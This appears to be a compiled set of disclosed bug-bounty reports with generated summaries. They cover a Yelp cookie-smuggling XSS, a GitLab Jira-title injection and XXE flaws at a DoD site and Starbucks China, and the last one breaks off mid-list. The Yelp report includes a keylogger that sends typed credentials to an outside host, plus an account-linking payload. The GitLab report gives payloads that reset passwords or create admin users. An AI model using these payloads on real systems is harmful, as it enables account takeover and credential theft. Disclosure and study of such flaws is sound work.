This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on https://biz.yelp.com/login to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".
Description
XSS via "guvo" cookie
The value of the cookie guvo is reflected (unescaped) on some pages. Most interestingly on the frontpage of www.yelp.com and on the login page of https://biz.yelp.com/login. The unescaped reflection happens in the window.ySitRepParams object and the window.yelp.guv property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████
Setting the "yelpmainpaastacanary" cookie
There is a feature on yelp.com where by adding the query parameter ?canary=asdf to a request, the response will contain an HTTP header:
Code 85 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
This gives us a way to set the cookie yelpmainpaastacanary to any value we want. But we need a way to control the guvo cookie. It turns out that we can smuggle the guvo cookie inside the yelpmainpaastacanary cookie.
Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
Code 17 Bytes
1Cookie: a=1; b=2;
which should be parsed as 2 cookies a and b. But if we set a cookie like:
Code 16 Bytes
1Cookie: a=1 b=2;
This should be parsed as 1 cookie a with the value "1 b=2", but Yelp will parse it as 2 cookies a and b. We can abuse this to smuggle the guvo cookie inside the yelpmainpaastacanary cookie by making a request to
Code 97 Bytes
1https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
████
which sets the cookie
Code 113 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
<image_0>
As an added bonus we can also inject a Max-Age: 99999999 attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
Code 123 Bytes
1https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
Code 143 Bytes
1Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
POCs
Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains.
Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on https://biz.yelp.com/login when the user types, or when the login form is submitted. The credentials are leaked to the domain calc.sh which I own:
Code 328 Bytes
1setTimeout(function () {
2  a = document.getElementsByName('password')[0];
3  b = document.getElementsByName('email')[0];
4  function f() {
5    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
6  }
7  a.form.onclick=f;
8  a.onchange=f;
9  b.onchange=f;
10  a.oninput=f;
11  b.oninput=f;
12}, 1000)
We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
Code 889 Bytes
1https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
Our final link looks like this:
Code 509 Bytes
1https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███
Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from https://yelp.com/profile_sharing. The final request in the Google-link-flow is a POST request to https://www.yelp.dk/google_connect/register with CSRF token csrftok and a token id_token which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.
To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████
Now that we have a token for the Google accoutn ██████ we can create an XSS payload for a victim. In this code we make a request to /profile_sharing and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the id_token we prepared:
Code 1.54 KiB
1(function f() {
2  a = new XMLHttpRequest();
3  a.addEventListener('load', function () {
4    rx = /"GoogleConnect": "([^"]*)/;
5    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
6    b = rx.exec(this.responseText);
7    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
8  });
9  a.open('GET', 'https://www.yelp.dk/profile_sharing');
10  a.send();
11})();
Again, we use this cyberchef recipe to create a link that infects the victim:
Code 2.50 KiB
1https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw
And the final link looks like this:
Code 2.07 KiB
1https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
This video shows the attack. On the left is the victim and on the right is the attacker. The victim is logged into their yelp account. He then signs out and at some point visits our malicious link. When the victim sometime later signs into his Yelp account our payload triggers and our Google account ████ is linked to the victim. The attacker can now sign in with Google and gets signed into the victims account.
██████████
Impact
This attack can be used to completely compromise business accounts, and do account takeovers on normal accounts on yelp.com. Since the cookie does not expire, all it takes is for the victim to at some point vist our link, and they'll be compromised when they later go to sign in to yelp.com. The link can be spread via the Yelp forum, reviews or private messages to other uses, making it easy to target other Yelp users.



================================================================================
Vulnerability Description:
The vulnerability involves chaining a cookie-based XSS with a cookie parsing issue to achieve persistent XSS on yelp.com. This allows for attacks such as injecting a keylogger to steal credentials or linking an attacker's Google account to a victim's Yelp account for account takeover.

Steps to Reproduce:
1. Identify that yelp.com reflects the content of the 'guvo' cookie in the HTML without proper escaping, leading to XSS.
2. Discover that the 'yelpmainpaastacanary' cookie can be set via a URL query parameter '?canary=[value]' on any *.yelp.com request.
3. Exploit the backend's cookie parsing issue by setting a 'yelpmainpaastacanary' cookie with a smuggled 'guvo' cookie value containing malicious JavaScript.
4. Use the XSS to inject a keylogger on the login page or link an attacker's Google account to a victim's Yelp account.
Exploitation Difficulty:
This vulnerability requires understanding and chaining multiple components: cookie reflection, cookie parsing quirks, and XSS exploitation. The interaction between these components is non-obvious, and the attack involves manipulating complex application states to achieve persistence and impact.

--------------------------------------------------------------------------------



Resource Injection Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1533976: Content injection in Jira issue title enabling sending arbitrary POST request as victim
================================================================================
RAW DESCRIPTION:

Summary
The issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.
This time it is the title field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.
For the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.
Background
There is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.
Giving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue v-safe-html attribute.
But as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.
If you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js
When a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js
To weaponize this, all we need is to first navigate away from the page to a server that just runs History.back() to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.
The payload
I will present two payloads that will show the potential damage from this attack.
There exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.
First of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example "sign in with GitHub". If the user does not actively go to /profile/password/edit and add a new password, the account is vulnerable to this attack. The password update page does not require "current password" before an initial password has been set. The payload looks like this
Code 254 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
If we pull this apart, we have
Code 560 Bytes
1<a 
2  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes
3  class=js-feature-highlight <--- the classname to be used as a gadget
4  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'
5  ^--- The payload where the POST request will get sent
6  >
7.</a> <--- close the anchor tag
8<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
9  ^--- Unlimited styling to make the website a bulletproof click machine :)
This will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.
When the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!
This payload will add a new administrator to the instance if an administrator visits the malicious page
Code 251 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Pulled apart
Code 257 Bytes
1<a href=http:j15.se
2  class=js-feature-highlight
3  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>
4.</a>
5<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Steps to reproduce
This requires three things:
access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)
a Jira server. I used a cloud Jira instance on atlassian.com
a third party account that is not registered on GitLab. ex a GitHub user
POC:
Create a user attacker
Log in as attacker and create a group attack_group by visiting https://gitlab.com/groups/new (make sure the group have premium access)
Create a new project in the group called attack_proj
Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit
Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project
Log in to Jira and create a task on the dashboard and name it <img src=#>
Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue
Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.
<image_0>
Now go back to Jira and create a new task and name it
Code 254 Bytes
1<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
Go back to the issue list and refresh to make sure it is created
Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com
(if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)
Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload
A page will show up looking empty, click anywhere on the page
The page will flicker, and now when you hover over the page it will show a big blue button stating "Got it!". Click it
<image_1>
Refresh the page, you should now be logged out from GitLab.com
Log in with the OAuth email and the password 12345678
Account takeover!
Important to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)
Impact
HTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.
What is the current bug behavior?
The name/title field in the Jira issue page is not sanitized
What is the expected correct behavior?
The name should be shown sanitized
Output of checks
This bug happens on GitLab.com
Impact
Account takeover and admin user creation through arbitrary POST request in Jira issue



================================================================================
Vulnerability Description:
The vulnerability involves HTML and CSS injection in the Jira issue title field within GitLab, which is not properly sanitized. This allows an attacker to craft a payload that, when clicked by a victim, sends arbitrary POST requests. The attack leverages JavaScript gadgets, browser caching quirks, and CSS manipulation to ensure the payload executes, leading to account takeover or admin user creation.

Steps to Reproduce:
1. Create a Jira issue with a malicious HTML title containing a crafted payload that exploits the JavaScript gadget and browser caching behavior.
2. Set up a GitLab project with Jira integration and have a victim user (with OAuth/SAML account) visit the malicious Jira issue page, click anywhere, and then click the 'Got it!' button to trigger the account takeover.
Exploitation Difficulty:
This vulnerability requires understanding multiple complex components: HTML/CSS injection, JavaScript gadget exploitation, browser caching behavior, and GitLab's Jira integration. The attacker must also craft a payload within Jira's 255-character limit and ensure it triggers correctly through user interaction. The interaction between these components is subtle and non-obvious, requiring deep knowledge of both GitLab and browser behaviors.

--------------------------------------------------------------------------------



XML External Entities (XXE) Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/227880: XXE in DoD website that may lead to RCE
================================================================================
RAW DESCRIPTION:

Summary:
XXE in https://█████
Description:
A malicious user can modify an XML-based request to include XML content that is then parsed locally.
Impact
An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser. The attacker can use an XML external entity vulnerability for getting unauthorised access to the OS file system.
PoC
Code 168 Bytes
1POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
2Host: https://███
3Content-type: text/xml
4Content-Length: 50
5
6<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>



================================================================================
Vulnerability Description:
The vulnerability is an XML External Entity (XXE) injection in a DoD website. It allows an attacker to send specially crafted XML requests that the server processes, potentially leading to unauthorized access to the local file system or other server-side resources.

Steps to Reproduce:
1. Send a POST request to /PSIGW/PeopleSoftServiceListeningConnector with a Content-Type header set to text/xml
2. Include a malicious XML payload in the request body that defines an external entity, e.g., <!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
Exploitation Difficulty:
The attack is straightforward, involving only the modification of an XML request to include an external entity. It does not require multiple components, complex state manipulation, or novel logic. The vulnerability is a well-known type (XXE) and the steps to exploit it are standard.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/500515: XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
================================================================================
RAW DESCRIPTION:

Description:
Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access to external dtd files.
Steps To Reproduce:
Upload and XXE vulnerability:
Log in to the user, enter the personal information settings page, click Upload Image
Intercept https access information through Burp suite
addd "html;" attributes in the parameter of "allow_file_type_list",or you can delete the params of "allow_file_type_list",then replace the filename's Suffix name ".jpg" to ".html"
Get the server's response information,visited the uploaded file URL. https://ecjobs.starbucks.com.cn/retail/tempfiles/temp_uploaded_641dee35-5a62-478e-90d7-f5558a78c60e.html
uploaded a malicious xml file to the server,change the parameter of "_hxpage"，like
POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;
or change the "HX_PAGE_NAME" params of xml date by post
POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"
post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.
Impact
The vulnerability can let the attacker upload the evil files in the server which will spoof the user,steal the user's cookie and informations.The XXE vulnerability disclose some server's informations ,denial of service attack，maybe will cause NTLMv2 hash attacks through XXE(the starbucks'server environment is iis 7.5+asp.net+windows), which could lead to attackers having full control over the server and the entire inner domain.
By the way,if the report isn't considered eligible.please let me close this report myself.Thank you



================================================================================
Vulnerability Description:
The vulnerability involves bypassing security restrictions to upload malicious files (HTML, XML) leading to stored XSS and XXE attacks. The XXE vulnerability can disclose server information, cause denial of service, and potentially lead to NTLMv2 hash attacks, giving attackers control over the server.

Steps to Reproduce:
1. Log in to the user, enter the personal information settings page, click Upload Image
2. Intercept https access information through Burp suite
